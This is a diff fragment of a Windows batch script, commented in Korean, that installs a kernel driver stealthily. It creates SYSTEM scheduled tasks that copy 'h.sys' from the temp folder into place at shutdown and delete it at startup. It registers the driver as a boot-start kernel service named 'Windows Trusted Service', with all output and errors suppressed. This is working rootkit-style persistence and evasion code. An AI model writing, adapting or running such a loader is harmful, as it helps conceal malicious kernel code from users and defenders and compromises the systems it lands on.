@@ -28,9 +28,9 @@ icacls "%target%" /grant administrators:F >nul 2>&1
 
 :: [4] 예약된 작업 생성
 schtasks /create /tn "CopyDriverOnShutdown" /tr "cmd.exe /c copy /Y \"%TEMP%\h.sys\" \"%target%\"" /sc ONEVENT /ec System /mo "*[System[EventID=1074]]" /ru "SYSTEM" /f >nul 2>&1
-schtasks /create /tn "DeleteDriverOnStartup" /tr "cmd.exe /c timeout /t 5 /nobreak ^& del /f /q \"%target%\"" /sc ONSTART /ru "SYSTEM" /f >nul 2>&1
+schtasks /create /tn "DeleteDriverOnStartup" /tr "cmd.exe /c \"ping 127.0.0.1 -n 6 >nul 2>&1 && del /f /q \"\"%target%\"\"\"" /sc ONSTART /ru "SYSTEM" /f >nul 2>&1
 
-:: [5] 커널 드라이버 서비스 등록
+:: [5] 커널 드라이버 서비스 등록s
 sc delete %svc% >nul 2>&1
 timeout /t 1 /nobreak >nul
 sc create %svc% binPath= "%target%" DisplayName= "Windows Trusted Service" start= boot type= kernel error= ignore >nul 2>&1
